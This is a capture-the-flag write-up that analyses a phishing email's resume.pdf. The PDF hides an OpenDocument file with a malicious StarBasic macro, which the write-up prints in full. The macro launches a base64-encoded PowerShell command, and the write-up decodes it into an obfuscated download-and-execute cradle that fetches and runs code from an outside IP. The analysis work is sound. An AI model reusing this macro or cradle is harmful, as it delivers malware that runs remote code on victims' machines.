Description
---
**Techarisma Chapter 1/7**

One of our Offensive Operations guys is on the inside of the hacking
crew Haxquad. He has compromised one of them and extracted an email. Seems like
they are working on something new. Can you take a look and see if you can find anything
interesting?

Wat do
---
Upon opening the provided .eml there's a file attached: `resume.pdf`.

Let's try binwalk to se if there's something hidden;

```bash
binwalk -e resume.pdf

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.1"
887           0x377           Zlib compressed data, default compression
```

This drops two files; `377` and `377.zlib`

```bash
file 377 377.zlib

377:      OpenDocument Text
377.zlib: zlib compressed data
```

Seeing that they are both compressed files, you could use something like 7zip to explore them, or just another round with binwalk:

```bash
binwalk -e 377

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, compressed size: 39, uncompressed size: 39, name: mimetype
77            0x4D            Zip archive data, at least v2.0 to extract, name: Basic/Standard/evil_macro.xml
824           0x338           Zip archive data, at least v2.0 to extract, name: Basic/Standard/script-lb.xml
1115          0x45B           Zip archive data, at least v2.0 to extract, name: Basic/script-lc.xml
1391          0x56F           Zip archive data, at least v2.0 to extract, name: Configurations2/accelerator/
1449          0x5A9           Zip archive data, at least v2.0 to extract, name: Configurations2/toolpanel/
1505          0x5E1           Zip archive data, at least v2.0 to extract, name: Configurations2/images/Bitmaps/
1566          0x61E           Zip archive data, at least v2.0 to extract, name: Configurations2/toolbar/
1620          0x654           Zip archive data, at least v2.0 to extract, name: Configurations2/floater/
1674          0x68A           Zip archive data, at least v2.0 to extract, name: Configurations2/popupmenu/
1730          0x6C2           Zip archive data, at least v2.0 to extract, name: Configurations2/menubar/
1784          0x6F8           Zip archive data, at least v2.0 to extract, name: Configurations2/statusbar/
1840          0x730           Zip archive data, at least v2.0 to extract, name: Configurations2/progressbar/
1898          0x76A           Zip archive data, at least v2.0 to extract, name: manifest.rdf
2217          0x8A9           Zip archive data, at least v2.0 to extract, name: meta.xml
2769          0xAD1           Zip archive data, at least v2.0 to extract, name: settings.xml
4720          0x1270          Zip archive data, at least v2.0 to extract, compressed size: 3228, uncompressed size: 3228, name: Thumbnails/thumbnail.png
8002          0x1F42          Zip archive data, at least v2.0 to extract, name: styles.xml
10448         0x28D0          Zip archive data, at least v2.0 to extract, name: content.xml
11542         0x2D16          Zip archive data, at least v2.0 to extract, name: META-INF/manifest.xml
13287         0x33E7          End of Zip archive, footer length: 22
```

`Basic/Standard/evil_macro.xml` immediatly stands out and sure enough it's a b64-encoded powershell command;

```bash
cat evil_macro.xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evil_macro" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
        Shell(&quot;cmd /c &apos;powershell -ep bypass -e JijigJx7MX17MH3igJ0gLWYg4oCYRVjigJks4oCZSeKAmSkoJijigJx7MX17MH17Mn3igJ0tZiDigJhPYmpl4oCZLOKAmU5ldy3igJgs4oCZY3TigJkpICjigJx7MX17NH17M317MH17Mn3igJ0gLWbigJlDbGll4oCZLOKAmU7igJks4oCZbnTigJks4oCZdC5XZWLigJks4oCZZeKAmSkpLijigJx7MX17M317MH17Mn3igJ0gLWYg4oCYdHJpbuKAmSzigJlEb3dubOKAmSzigJln4oCZLOKAmW9hZFPigJkpLkludm9rZSgoIns1Mn17NTN9ezU0fXsyfXs4fXs0OX17NDd9ezR9ezE0fXsyOH17MTB9ezd9ezUxfXsxOX17NDh9ezMzfXs3fXs1fXs1MH0iIC1mICdZJywnUCcsJ0UnLCd1JywnTScsJ1gnLCduJywnMCcsJ1AnLCdmJywnZCcsJ2UnLCcmJywnLycsJzQnLCdTZScsJ2cnLCdpJywnbicsJ3MnLCdlJywnRScsJzUnLCc4JywnMicsJ1YnLCd2eicsJ00nLCdsJywnQScsJ2EnLCdiYWQnLCdlcicsJ3InLCdvJywndScsJ3AnLCdQUCcsJ3paJywnZG93bicsJ3VwJywnZXYnLCdpbCcsJ2V4ZScsJ3BzJywnNCcsJ20nLCd7JywnXycsJ1QnLCd9JywnYycsJ2h0dHBzJywgJzovLycsJzE5Mi4xNjguMTQzLjEyOC8nKSk=&apos;&quot;)
End Sub
```

Decoding this reveals a semi-obfuscated command

`&(“{1}{0}” -f ‘EX’,’I’)(&(“{1}{0}{2}”-f ‘Obje’,’New-‘,’ct’) (“{1}{4}{3}{0}{2}” -f’Clie’,’N’,’nt’,’t.Web’,’e’)).(“{1}{3}{0}{2}” -f ‘trin’,’Downl’,’g’,’oadS’).Invoke(("{52}{53}{54}{2}{8}{49}{47}{4}{14}{28}{10}{7}{51}{19}{48}{33}{7}{5}{50}" -f ,'https', '://','192.168.143.128/'))`

This looks like something deciding the order of the following characters in the command. It's clear that the first sequence spells `IEX`, second `New-Object`, third `Net.WebClient` etc. So what's left in the final sequnce is just mapping the numbers to the corresponding characters.

```bash
echo "'Y','P','E','u','M','X','n','0','P','f','d','e','&','/','4','Se','g','i','n','s','e','E','5','8','2','V','vz','M','l','A','a','bad','er','r','o','u','p','PP','zZ','down','up','ev','il','exe','ps','4','m','{','_','T','}','c'" > chars
```
